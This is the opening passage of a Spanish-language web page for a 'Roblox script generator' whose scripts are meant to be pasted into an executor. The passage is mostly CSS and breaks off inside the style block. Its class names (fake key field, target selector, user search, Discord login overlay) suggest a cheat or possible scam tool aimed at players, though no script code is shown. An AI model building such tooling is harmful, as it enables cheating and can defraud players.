<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CHOCOLA MOREIRA — Script Generator</title>
    <meta property="og:title" content="⚡ CHOCOLA MOREIRA — Script Generator" />
    <meta property="og:description" content="Genera scripts para Roblox al instante. Configura tu script y cópialo en tu executor." />
    <meta property="og:url" content="https://chocola-moreira1.vercel.app" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="https://ik.imagekit.io/dr6z4tib7/3f9c4436df34b7011b368cdf587f047f.png?updatedAt=1785798108862" />
    <meta property="theme-color" content="#00ffff" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="⚡ CHOCOLA MOREIRA — Script Generator" />
    <meta name="twitter:description" content="Genera scripts para Roblox al instante." />
    <meta name="twitter:image" content="https://ik.imagekit.io/dr6z4tib7/3f9c4436df34b7011b368cdf587f047f.png?updatedAt=1785798108862" />
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800;14..32,900&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0f; font-family: 'Inter', sans-serif; min-height: 100vh; color: #fff; overflow-x: hidden; }
        #stars-canvas { position: fixed; inset: 0; pointer-events: none; z-index: 0; width: 100%; height: 100%; }
        #glow { position: fixed; inset: 0; pointer-events: none; z-index: 1;
            background: radial-gradient(ellipse at 25% 35%, rgba(0, 255, 255, 0.06) 0%, transparent 55%),
                        radial-gradient(ellipse at 75% 65%, rgba(0, 255, 255, 0.04) 0%, transparent 50%),
                        radial-gradient(ellipse at 50% 50%, rgba(0, 200, 255, 0.03) 0%, transparent 70%); }
        .container { position: relative; z-index: 2; max-width: 780px; margin: 0 auto; padding: 2rem 1rem; }
        .login-overlay { position: fixed; inset: 0; z-index: 999; display: flex; align-items: center; justify-content: center; background: #0a0a0f; transition: opacity 0.5s ease, visibility 0.5s ease; }
        .login-overlay.hidden { opacity: 0; visibility: hidden; pointer-events: none; }
        .login-card { background: rgba(13, 8, 25, 0.8); backdrop-filter: blur(30px); border-radius: 32px; border: 1px solid rgba(0, 255, 255, 0.08); padding: 2.5rem 2rem; text-align: center; max-width: 420px; width: 90%; box-shadow: 0 25px 60px -12px rgba(0, 0, 0, 0.8); animation: slideUp 0.6s ease; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(40px) scale(0.95); } to { opacity: 1; transform: translateY(0) scale(1); } }
        .login-card .avatar { width: 120px; height: 120px; border-radius: 16px; margin: 0 auto 1.2rem; overflow: hidden; border: 2px solid rgba(0, 255, 255, 0.2); box-shadow: 0 0 40px rgba(0, 255, 255, 0.08); animation: avatar-pulse 3s ease-in-out infinite; }
        @keyframes avatar-pulse { 0%, 100% { box-shadow: 0 0 40px rgba(0, 255, 255, 0.05); } 50% { box-shadow: 0 0 80px rgba(0, 255, 255, 0.15); } }
        .login-card .avatar img { width: 100%; height: 100%; object-fit: cover; }
        .login-card h1 { font-size: 1.8rem; font-weight: 800; background: linear-gradient(135deg, #00ffff, #ff00ff, #00ffff); background-size: 300% 300%; -webkit-background-clip: text; background-clip: text; color: transparent; animation: shimmer 4s ease-in-out infinite; letter-spacing: 1px; margin-bottom: 0.25rem; }
        @keyframes shimmer { 0% { background-position: 0% 50%; } 25% { background-position: 100% 50%; } 50% { background-position: 100% 100%; } 75% { background-position: 0% 100%; } 100% { background-position: 0% 50%; } }
        .login-card .subtitle { font-size: 0.85rem; color: rgba(255, 255, 255, 0.3); margin-bottom: 1.8rem; }
        .login-card .server-badge { display: inline-flex; align-items: center; gap: 8px; background: rgba(88, 101, 242, 0.08); border: 1px solid rgba(88, 101, 242, 0.12); padding: 4px 14px; border-radius: 100px; font-size: 0.6rem; color: rgba(255, 255, 255, 0.3); margin-bottom: 1.8rem; }
        .login-card .server-badge .dot { width: 6px; height: 6px; background: #00ff88; border-radius: 50%; animation: dot-pulse 2s ease-in-out infinite; }
        @keyframes dot-pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.5; transform: scale(1.3); } }
        .login-card .discord-login-btn { display: inline-flex; align-items: center; justify-content: center; gap: 12px; width: 100%; padding: 14px 20px; background: linear-gradient(135deg, #5865F2, #4752c4); border: none; border-radius: 16px; color: #fff; font-weight: 600; font-size: 1rem; cursor: pointer; transition: all 0.3s ease; font-family: 'Inter', sans-serif; box-shadow: 0 4px 25px rgba(88, 101, 242, 0.2); }
        .login-card .discord-login-btn:hover { transform: scale(1.02); box-shadow: 0 8px 40px rgba(88, 101, 242, 0.4); }
        .login-card .discord-login-btn svg { width: 22px; height: 22px; flex-shrink: 0; }
        .login-card .login-footer { margin-top: 1.5rem; display: flex; flex-direction: column; align-items: center; gap: 4px; }
        .login-card .login-footer .server-link { font-size: 0.7rem; color: rgba(255, 255, 255, 0.2); text-decoration: none; transition: color 0.3s ease; }
        .login-card .login-footer .server-link:hover { color: rgba(255, 255, 255, 0.5); }
        .login-card .login-footer .protected { font-size: 0.5rem; color: rgba(255, 255, 255, 0.06); text-transform: uppercase; letter-spacing: 2px; margin-top: 4px; }
        .login-card .login-footer .protected span { color: rgba(0, 255, 255, 0.1); }
        .header { text-align: center; margin-bottom: 2rem; position: relative; }
        .live-badge { display: inline-flex; align-items: center; gap: 8px; background: rgba(0, 255, 255, 0.1); border: 1px solid rgba(0, 255, 255, 0.25); padding: 5px 16px; border-radius: 100px; font-size: 0.7rem; margin-bottom: 1rem; backdrop-filter: blur(4px); font-weight: 500; box-shadow: 0 0 20px rgba(0, 255, 255, 0.05); animation: glow-border 3s ease-in-out infinite; }
        @keyframes glow-border { 0%, 100% { border-color: rgba(0, 255, 255, 0.25); box-shadow: 0 0 20px rgba(0, 255, 255, 0.05); } 50% { border-color: rgba(0, 255, 255, 0.6); box-shadow: 0 0 40px rgba(0, 255, 255, 0.15); } }
        .live-dot { width: 8px; height: 8px; background: #00ffff; border-radius: 50%; animation: pulse-dot 1.5s ease-in-out infinite; box-shadow: 0 0 12px rgba(0, 255, 255, 0.4); }
        @keyframes pulse-dot { 0%, 100% { opacity: 1; transform: scale(1); box-shadow: 0 0 12px rgba(0, 255, 255, 0.4); } 50% { opacity: 0.6; transform: scale(1.3); box-shadow: 0 0 25px rgba(0, 255, 255, 0.7); } }
        .logo { font-size: 3.2rem; font-weight: 800; background: linear-gradient(135deg, #00ffff, #ff00ff, #00ffff, #ff00ff); background-size: 300% 300%; -webkit-background-clip: text; background-clip: text; color: transparent; animation: logo-shimmer 5s ease-in-out infinite; text-shadow: 0 0 40px rgba(0, 255, 255, 0.2), 0 0 80px rgba(0, 255, 255, 0.05); letter-spacing: 1px; }
        @keyframes logo-shimmer { 0% { background-position: 0% 50%; } 25% { background-position: 100% 50%; } 50% { background-position: 100% 100%; } 75% { background-position: 0% 100%; } 100% { background-position: 0% 50%; } }
        .tagline { color: rgba(255, 255, 255, 0.3); font-size: 0.85rem; margin-top: 0.5rem; font-weight: 400; }
        .language-selector { position: fixed; top: 16px; left: 16px; z-index: 100; display: flex; gap: 6px; background: rgba(13, 8, 25, 0.8); backdrop-filter: blur(10px); padding: 4px 8px; border-radius: 12px; border: 1px solid rgba(0, 255, 255, 0.1); }
        .language-selector button { background: transparent; border: none; color: rgba(255, 255, 255, 0.4); cursor: pointer; font-size: 0.75rem; padding: 4px 8px; border-radius: 6px; transition: all 0.3s ease; font-weight: 600; font-family: 'Inter', sans-serif; }
        .language-selector button:hover { color: rgba(255, 255, 255, 0.8); background: rgba(255, 255, 255, 0.05); }
        .language-selector button.active { color: #00ffff; background: rgba(0, 255, 255, 0.1); box-shadow: 0 0 20px rgba(0, 255, 255, 0.05); }
        .language-selector .separator { color: rgba(255, 255, 255, 0.1); font-size: 0.7rem; display: flex; align-items: center; }
        .discord-corner { position: fixed; top: 16px; right: 16px; z-index: 100; display: flex; align-items: center; gap: 10px; }
        .discord-corner .user-info { display: flex; align-items: center; gap: 8px; font-size: 0.8rem; color: rgba(255, 255, 255, 0.7); }
        .discord-corner .user-info .avatar-small { width: 28px; height: 28px; border-radius: 50%; object-fit: cover; border: 2px solid rgba(0, 255, 255, 0.3); }
        .discord-btn { display: flex; align-items: center; gap: 8px; padding: 8px 16px; background: linear-gradient(135deg, #5865F2, #4752c4); border: none; border-radius: 10px; color: #fff; font-weight: 600; font-size: 0.8rem; cursor: pointer; transition: all 0.3s ease; white-space: nowrap; font-family: 'Inter', sans-serif; box-shadow: 0 4px 20px rgba(88, 101, 242, 0.2); position: relative; overflow: hidden; }
        .discord-btn::before { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.15), transparent); transition: left 0.5s ease; }
        .discord-btn:hover::before { left: 100%; }
        .discord-btn:hover { transform: scale(1.05); box-shadow: 0 4px 30px rgba(88, 101, 242, 0.5); }
        .discord-btn.verified { background: linear-gradient(135deg, #22c55e, #16a34a); box-shadow: 0 4px 20px rgba(34, 197, 94, 0.3); }
        .discord-btn.verified:hover { box-shadow: 0 4px 30px rgba(34, 197, 94, 0.6); }
        .discord-btn svg { width: 18px; height: 18px; flex-shrink: 0; }
        .badges { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center; margin-bottom: 1.5rem; }
        .badge { background: rgba(0, 255, 255, 0.06); border: 1px solid rgba(0, 255, 255, 0.12); padding: 4px 14px; border-radius: 100px; font-size: 0.7rem; color: rgba(0, 255, 255, 0.75); transition: all 0.3s ease; backdrop-filter: blur(4px); font-weight: 500; animation: badge-glow 4s ease-in-out infinite; }
        .badge:nth-child(1) { animation-delay: 0s; } .badge:nth-child(2) { animation-delay: 0.5s; } .badge:nth-child(3) { animation-delay: 1s; } .badge:nth-child(4) { animation-delay: 1.5s; } .badge:nth-child(5) { animation-delay: 2s; } .badge:nth-child(6) { animation-delay: 2.5s; } .badge:nth-child(7) { animation-delay: 3s; } .badge:nth-child(8) { animation-delay: 3.5s; } .badge:nth-child(9) { animation-delay: 4s; }
        @keyframes badge-glow { 0%, 100% { border-color: rgba(0, 255, 255, 0.12); box-shadow: 0 0 10px rgba(0, 255, 255, 0.02); } 50% { border-color: rgba(0, 255, 255, 0.35); box-shadow: 0 0 25px rgba(0, 255, 255, 0.08); } }
        .badge:hover { background: rgba(0, 255, 255, 0.12); border-color: rgba(0, 255, 255, 0.5); transform: translateY(-2px) scale(1.05); box-shadow: 0 0 40px rgba(0, 255, 255, 0.15); }
        .new-badge { display: inline-block; font-size: 0.45rem; font-weight: 800; padding: 1px 8px; border-radius: 4px; margin-left: 4px; text-transform: uppercase; letter-spacing: 0.5px; line-height: 1.4; background: linear-gradient(90deg, #ff0000, #ff7700, #ffff00, #00ff00, #0000ff, #8b00ff, #ff00ff); background-size: 300% 100%; -webkit-background-clip: text; background-clip: text; color: transparent; animation: rainbow-text 3s linear infinite; text-shadow: 0 0 20px rgba(255, 0, 255, 0.3), 0 0 40px rgba(0, 255, 255, 0.2); }
        @keyframes rainbow-text { 0% { background-position: 0% 50%; } 100% { background-position: 300% 50%; } }
        .new-badge-wrapper { display: inline-block; background: rgba(0, 0, 0, 0.4); padding: 1px 2px; border-radius: 6px; border: 1px solid rgba(255, 255, 255, 0.05); animation: glow-pulse 2s ease-in-out infinite; }
        @keyframes glow-pulse { 0%, 100% { box-shadow: 0 0 20px rgba(255, 0, 255, 0.1); } 50% { box-shadow: 0 0 40px rgba(255, 0, 255, 0.3), 0 0 60px rgba(0, 255, 255, 0.15); } }
        .card { background: rgba(13, 8, 25, 0.75); backdrop-filter: blur(20px); border-radius: 28px; border: 1px solid rgba(0, 255, 255, 0.08); overflow: hidden; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(0, 255, 255, 0.04); transition: all 0.4s ease; margin-bottom: 1.5rem; }
        .card:hover { border-color: rgba(0, 255, 255, 0.2); box-shadow: 0 0 60px rgba(0, 255, 255, 0.05), 0 25px 50px -12px rgba(0, 0, 0, 0.6); }
        .card-header { padding: 1.25rem 1.5rem; border-bottom: 1px solid rgba(255, 255, 255, 0.04); background: rgba(0, 0, 0, 0.3); }
        .card-header h2 { font-size: 1rem; font-weight: 600; color: rgba(255, 255, 255, 0.8); letter-spacing: 0.5px; }
        .card-header h2::before { content: '✦ '; color: #00ffff; }
        .card-body { padding: 1.5rem; }
        .form-label { display: block; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; color: #88ffff; margin-bottom: 0.5rem; text-shadow: 0 0 15px rgba(0, 255, 255, 0.15); transition: all 0.3s ease; }
        .form-label:hover { color: #00ffff; text-shadow: 0 0 30px rgba(0, 255, 255, 0.3); }
        .user-input { width: 100%; padding: 12px 16px; background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 255, 255, 0.15); border-radius: 14px; color: #fff; font-size: 0.9rem; transition: all 0.3s ease; box-shadow: 0 0 20px rgba(0, 255, 255, 0.05), inset 0 0 20px rgba(0, 255, 255, 0.02); }
        .user-input:focus { outline: none; border-color: #00ffff; box-shadow: 0 0 0 3px rgba(0, 255, 255, 0.15), 0 0 40px rgba(0, 255, 255, 0.1); }
        .user-input::placeholder { color: rgba(255, 255, 255, 0.25); }
        .user-input:disabled { opacity: 0.4; cursor: not-allowed; }
        .user-input.error { border-color: #ff4444; box-shadow: 0 0 0 3px rgba(255, 68, 68, 0.15); }
        .form-group { margin-bottom: 1.25rem; }
        .script-mode-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 12px; margin-bottom: 16px; }
        .mode-card { background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 16px; padding: 16px 12px; text-align: center; cursor: pointer; transition: all 0.3s ease; position: relative; overflow: hidden; min-height: 110px; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .mode-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: linear-gradient(135deg, rgba(0, 255, 255, 0.04), transparent); opacity: 0; transition: opacity 0.3s ease; }
        .mode-card:hover:not(.disabled)::before { opacity: 1; }
        .mode-card:hover:not(.disabled) { transform: translateY(-2px); border-color: rgba(0, 255, 255, 0.15); box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3); }
        .mode-card.active { background: linear-gradient(135deg, rgba(0, 255, 255, 0.08), rgba(0, 200, 255, 0.03)); border-color: #00ffff; box-shadow: 0 0 30px rgba(0, 255, 255, 0.05), inset 0 0 30px rgba(0, 255, 255, 0.02); }
        .mode-card.active .mode-title { color: #00ffff; text-shadow: 0 0 20px rgba(0, 255, 255, 0.15); }
        .mode-card .mode-icon { font-size: 1.8rem; margin-bottom: 4px; display: block; }
        .mode-card .mode-title { font-size: 0.85rem; font-weight: 700; color: #fff; margin-bottom: 2px; letter-spacing: 0.3px; }
        .mode-card .mode-desc { font-size: 0.7rem; color: rgba(255, 255, 255, 0.4); line-height: 1.4; }
        .mode-card.disabled { opacity: 0.4; cursor: not-allowed; }
        .mode-card.disabled:hover { transform: none; border-color: rgba(255, 255, 255, 0.06); box-shadow: none; }
        .custom-area { display: none; margin-top: 12px; }
        .user-search-wrapper { position: relative; }
        .user-results { position: absolute; top: 100%; left: 0; right: 0; margin-top: 8px; background: #1a1a2e; border: 1px solid rgba(0, 255, 255, 0.2); border-radius: 16px; max-height: 300px; overflow-y: auto; z-index: 50; display: none; }
        .user-results.show { display: block; }
        .user-result { display: flex; align-items: center; gap: 12px; padding: 10px 14px; cursor: pointer; border-bottom: 1px solid rgba(255, 255, 255, 0.04); }
        .user-result:hover { background: rgba(0, 255, 255, 0.06); }
        .user-result img { width: 36px; height: 36px; border-radius: 50%; object-fit: cover; }
        .user-result .info { flex: 1; }
        .user-result .name { font-weight: 600; font-size: 0.85rem; }
        .user-result .username { font-size: 0.65rem; color: rgba(255, 255, 255, 0.3); }
        .user-result .id { font-size: 0.65rem; color: #00ffff; font-family: monospace; }
        .selected-user { background: rgba(0, 255, 255, 0.06); border: 1px solid rgba(0, 255, 255, 0.12); border-radius: 14px; padding: 10px 14px; margin-top: 10px; display: none; align-items: center; gap: 14px; }
        .selected-user.show { display: flex; }
        .selected-user .avatar-container { width: 48px; height: 48px; border-radius: 50%; overflow: hidden; flex-shrink: 0; border: 2px solid rgba(0, 255, 255, 0.2); }
        .selected-user .avatar-container img { width: 100%; height: 100%; object-fit: cover; }
        .selected-user .info { flex: 1; }
        .selected-user .name { font-weight: 600; font-size: 0.95rem; color: #fff; }
        .selected-user .id { font-size: 0.7rem; color: rgba(255, 255, 255, 0.3); font-family: monospace; }
        .target-selector-wrapper { margin-bottom: 1.25rem; }
        .target-selector-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem; }
        .target-selector-header .label { font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; color: #88ffff; text-shadow: 0 0 15px rgba(0, 255, 255, 0.15); transition: all 0.3s ease; }
        .target-selector-header .label:hover { color: #00ffff; text-shadow: 0 0 30px rgba(0, 255, 255, 0.3); }
        .target-selector-header .count { font-size: 0.7rem; color: rgba(255, 255, 255, 0.25); }
        .selected-chips { display: flex; flex-wrap: wrap; gap: 6px; min-height: 0; align-items: center; margin-bottom: 6px; }
        .selected-chips:empty { display: none; }
        .selected-chips .chip { display: inline-flex; align-items: center; gap: 4px; background: rgba(0, 255, 255, 0.06); border: 1px solid rgba(0, 255, 255, 0.1); padding: 2px 8px 2px 6px; border-radius: 14px; font-size: 0.65rem; color: rgba(255, 255, 255, 0.75); cursor: pointer; transition: all 0.2s; }
        .selected-chips .chip:hover { background: rgba(255, 0, 0, 0.1); border-color: rgba(255, 0, 0, 0.2); }
        .selected-chips .chip .chip-thumb { width: 16px; height: 16px; border-radius: 4px; overflow: hidden; flex-shrink: 0; }
        .selected-chips .chip .chip-thumb img { width: 100%; height: 100%; object-fit: cover; border-radius: 4px; }
        .selected-chips .chip .chip-remove { font-size: 0.7rem; color: rgba(255, 255, 255, 0.3); margin-left: 2px; transition: color 0.2s; }
        .selected-chips .chip:hover .chip-remove { color: #ff4444; }
        .selected-chips .chip-more { font-size: 0.65rem; color: rgba(255, 255, 255, 0.3); padding: 2px 6px; }
        .target-selector-btn { width: 100%; padding: 12px 16px; background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(0, 255, 255, 0.1); border-radius: 14px; color: rgba(255, 255, 255, 0.6); font-size: 0.85rem; display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 0 15px rgba(0, 255, 255, 0.03); }
        .target-selector-btn:hover:not(.disabled) { border-color: rgba(0, 255, 255, 0.4); background: rgba(0, 255, 255, 0.06); box-shadow: 0 0 40px rgba(0, 255, 255, 0.08); color: rgba(255, 255, 255, 0.9); }
        .target-selector-btn .arrow { color: rgba(255, 255, 255, 0.2); transition: transform 0.3s; }
        .target-selector-btn .arrow.open { transform: rotate(180deg); color: #00ffff; }
        .target-panel { background: #1a1a2e; border: 1px solid rgba(0, 255, 255, 0.2); border-radius: 16px; margin-top: 8px; padding: 12px; display: none; max-height: 420px; overflow: hidden; }
        .target-panel.open { display: block; }
        .target-panel .search-input { width: 100%; padding: 10px 14px; background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 255, 255, 0.1); border-radius: 12px; color: #fff; font-size: 0.85rem; margin-bottom: 10px; transition: all 0.2s; box-shadow: 0 0 15px rgba(0, 255, 255, 0.03); }
        .target-panel .search-input:focus { outline: none; border-color: #00ffff; box-shadow: 0 0 0 3px rgba(0, 255, 255, 0.1), 0 0 30px rgba(0, 255, 255, 0.05); }
        .target-panel .search-input:disabled { opacity: 0.4; cursor: not-allowed; }
        .target-panel .search-input::placeholder { color: rgba(255, 255, 255, 0.2); }
        .panel-actions { display: flex; gap: 8px; margin-bottom: 10px; flex-wrap: wrap; }
        .panel-actions button { flex: 1; padding: 8px; background: rgba(0, 255, 255, 0.06); border: 1px solid rgba(0, 255, 255, 0.08); border-radius: 10px; color: #00ffff; cursor: pointer; font-size: 0.7rem; font-weight: 500; transition: all 0.2s; min-width: 80px; }
        .panel-actions button:hover:not(:disabled) { background: rgba(0, 255, 255, 0.12); }
        .panel-actions button:disabled { opacity: 0.4; cursor: not-allowed; }
        .panel-actions .close-btn { background: rgba(255, 255, 255, 0.03); border-color: rgba(255, 255, 255, 0.04); color: rgba(255, 255, 255, 0.4); flex: 0.5; }
        .panel-actions .close-btn:hover:not(:disabled) { background: rgba(255, 255, 255, 0.06); }
        .panel-quick-buttons { display: flex; gap: 6px; margin-bottom: 10px; flex-wrap: wrap; }
        .panel-quick-btn { font-size: 0.6rem; font-weight: 600; padding: 4px 12px; border-radius: 100px; border: 1px solid rgba(255, 255, 255, 0.08); background: rgba(255, 255, 255, 0.03); color: rgba(255, 255, 255, 0.4); cursor: pointer; transition: all 0.3s ease; font-family: 'Inter', sans-serif; }
        .panel-quick-btn:hover:not(:disabled) { background: rgba(255, 255, 255, 0.08); color: rgba(255, 255, 255, 0.8); border-color: rgba(255, 255, 255, 0.2); }
        .panel-quick-btn.og { border-color: rgba(255, 215, 0, 0.2); color: #FFD700; }
        .panel-quick-btn.og:hover:not(:disabled) { background: rgba(255, 215, 0, 0.1); border-color: #FFD700; box-shadow: 0 0 30px rgba(255, 215, 0, 0.1); }
        .panel-quick-btn.secret { border-color: rgba(255, 0, 255, 0.2); color: #ff00ff; }
        .panel-quick-btn.secret:hover:not(:disabled) { background: rgba(255, 0, 255, 0.1); border-color: #ff00ff; box-shadow: 0 0 30px rgba(255, 0, 255, 0.1); }
        .target-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 8px; max-height: 260px; overflow-y: auto; padding-right: 4px; }
        .target-grid::-webkit-scrollbar { width: 4px; }
        .target-grid::-webkit-scrollbar-track { background: transparent; }
        .target-grid::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.1); border-radius: 4px; }
        .target-item { display: flex; flex-direction: column; align-items: center; gap: 6px; padding: 10px 8px 8px; background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.03); border-radius: 12px; cursor: pointer; transition: all 0.3s ease; position: relative; }
        .target-item:hover:not(.disabled) { background: rgba(0, 255, 255, 0.06); border-color: rgba(0, 255, 255, 0.2); transform: translateY(-3px); box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3); }
        .target-item.selected { background: rgba(0, 255, 255, 0.08); border-color: #00ffff; box-shadow: 0 0 30px rgba(0, 255, 255, 0.05), inset 0 0 30px rgba(0, 255, 255, 0.02); }
        .target-item .thumbnail { width: 56px; height: 56px; border-radius: 12px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; overflow: hidden; background: transparent; border: none; position: relative; }
        .target-item .thumbnail img { width: 100%; height: 100%; object-fit: cover; border-radius: 12px; }
        .target-item .target-name { font-size: 0.65rem; font-weight: 500; color: rgba(255, 255, 255, 0.6); text-align: center; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 100%; padding: 0 2px; }
        .target-item .check { position: absolute; top: 4px; right: 4px; width: 18px; height: 18px; border: 1.5px solid rgba(255, 255, 255, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 10px; background: rgba(0,0,0,0.5); transition: all 0.3s ease; }
        .target-item.selected .check { background: #00ffff; border-color: #00ffff; color: #000; box-shadow: 0 0 20px rgba(0, 255, 255, 0.2); }
        .toggles-container { display: flex; flex-direction: column; gap: 10px; margin-bottom: 16px; }
        .toggle-row { display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.04); border-radius: 16px; width: 100%; transition: all 0.3s ease; }
        .toggle-row:hover { border-color: rgba(0, 255, 255, 0.15); box-shadow: 0 0 30px rgba(0, 255, 255, 0.03); }
        .toggle-row .toggle-label p:first-child { font-size: 0.8rem; font-weight: 600; margin-bottom: 2px; color: #88ffff; text-shadow: 0 0 15px rgba(0, 255, 255, 0.15); transition: all 0.3s ease; }
        .toggle-row:hover .toggle-label p:first-child { color: #00ffff; text-shadow: 0 0 25px rgba(0, 255, 255, 0.3); }
        .toggle-row .toggle-label p:last-child { font-size: 0.6rem; color: rgba(255, 255, 255, 0.4); transition: all 0.3s ease; }
        .toggle-row:hover .toggle-label p:last-child { color: rgba(255, 255, 255, 0.6); }
        .toggle-btn { width: 48px; height: 26px; border-radius: 30px; position: relative; cursor: pointer; border: none; transition: all 0.3s ease; flex-shrink: 0; box-shadow: 0 0 10px rgba(0, 0, 0, 0.3); }
        .toggle-btn.on { background: linear-gradient(135deg, #00ffff, #00bbff); box-shadow: 0 0 25px rgba(0, 255, 255, 0.2); }
        .toggle-btn.on:hover { box-shadow: 0 0 40px rgba(0, 255, 255, 0.4); }
        .toggle-btn.off { background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.08); }
        .toggle-knob { position: absolute; top: 3px; width: 18px; height: 18px; border-radius: 50%; background: #fff; transition: left 0.3s cubic-bezier(0.34, 1.56, 0.64, 1); box-shadow: 0 2px 8px rgba(0,0,0,0.2); }
        .toggle-btn.on .toggle-knob { left: 27px; }
        .toggle-btn.off .toggle-knob { left: 3px; }
        .toggle-btn:disabled { opacity: 0.4; cursor: not-allowed; }
        .fake-key-group { display: none; margin-top: 8px; animation: fadeIn 0.3s ease; }
        .fake-key-group.show { display: block; }
        .fake-key-group .input-wrapper { display: flex; gap: 10px; align-items: center; }
        .fake-key-group .input-wrapper .user-input { flex: 1; }
        .fake-key-group .key-hint { font-size: 0.6rem; color: rgba(255, 255, 255, 0.2); margin-top: 4px; }
        .fake-key-group .key-hint .highlight { color: #ff00ff; }
        .script-name-hint { font-size: 0.6rem; color: rgba(255, 255, 255, 0.2); margin-top: 4px; }
        .script-name-hint .highlight { color: #00ffff; }
        .recommended-badge { background: linear-gradient(135deg, #00ff88, #00cc66); color: #000; font-size: 0.5rem; font-weight: 700; padding: 2px 8px; border-radius: 100px; margin-left: 6px; text-transform: uppercase; letter-spacing: 0.5px; box-shadow: 0 0 20px rgba(0, 255, 136, 0.3); animation: recomended-pulse 2s ease-in-out infinite; display: inline-block; }
        @keyframes recomended-pulse { 0%, 100% { box-shadow: 0 0 20px rgba(0, 255, 136, 0.2); } 50% { box-shadow: 0 0 40px rgba(0, 255, 136, 0.5); } }
        .generate-btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #00ffff, #00bbff); border: none; border-radius: 20px; color: #000; font-weight: 700; font-size: 1rem; cursor: pointer; margin-top: 1rem; position: relative; overflow: hidden; transition: all 0.3s ease; box-shadow: 0 4px 25px rgba(0, 255, 255, 0.15); }
        .generate-btn::before { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent); transition: left 0.6s ease; }
        .generate-btn:hover:not(:disabled)::before { left: 100%; }
        .generate-btn:hover:not(:disabled) { transform: scale(1.02); box-shadow: 0 8px 40px rgba(0, 255, 255, 0.3); }
        .generate-btn:active:not(:disabled) { transform: scale(0.97); }
        .generate-btn:disabled { background: linear-gradient(135deg, #1a1a2e, #0a0a0f); color: #444; cursor: not-allowed; box-shadow: none; }
        .result { margin-top: 1.5rem; display: none; animation: fadeIn 0.3s ease; }
        .result.show { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .result-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
        .copy-btn { padding: 6px 12px; background: rgba(0, 255, 255, 0.08); border: 1px solid rgba(0, 255, 255, 0.15); border-radius: 10px; color: #00ffff; cursor: pointer; font-size: 0.7rem; transition: all 0.2s; }
        .copy-btn:hover { background: rgba(0, 255, 255, 0.15); }
        .script-box { background: #0a0a0f; border: 1px solid rgba(255, 255, 255, 0.04); border-radius: 16px; padding: 1rem; font-family: 'Courier New', monospace; font-size: 0.7rem; color: #00ffff; white-space: pre-wrap; word-break: break-all; max-height: 450px; overflow: auto; }
        .credits-section { background: linear-gradient(145deg, rgba(13, 8, 25, 0.6), rgba(0, 20, 30, 0.4)); border: 1px solid rgba(0, 255, 255, 0.08); border-radius: 20px; padding: 1.8rem; margin-top: 2.5rem; display: flex; flex-direction: column; gap: 16px; transition: all 0.5s ease; position: relative; overflow: hidden; backdrop-filter: blur(10px); animation: credits-glow 4s ease-in-out infinite; }
        @keyframes credits-glow { 0%, 100% { border-color: rgba(0, 255, 255, 0.08); box-shadow: 0 0 30px rgba(0, 255, 255, 0.02); } 50% { border-color: rgba(0, 255, 255, 0.3); box-shadow: 0 0 60px rgba(0, 255, 255, 0.08); } }
        .credits-section::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: conic-gradient(from 0deg, transparent, rgba(0, 255, 255, 0.03), transparent, rgba(0, 255, 255, 0.03), transparent); animation: rotate-bg 20s linear infinite; }
        @keyframes rotate-bg { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .credits-section:hover { border-color: rgba(0, 255, 255, 0.5); box-shadow: 0 0 80px rgba(0, 255, 255, 0.12), inset 0 0 80px rgba(0, 255, 255, 0.03); transform: scale(1.01); }
        .credit-item { display: flex; align-items: center; gap: 20px; position: relative; z-index: 2; padding: 12px 16px; border-radius: 16px; background: rgba(0, 0, 0, 0.2); border: 1px solid rgba(255, 255, 255, 0.03); transition: all 0.3s ease; }
        .credit-item:hover { background: rgba(0, 255, 255, 0.04); border-color: rgba(0, 255, 255, 0.1); }
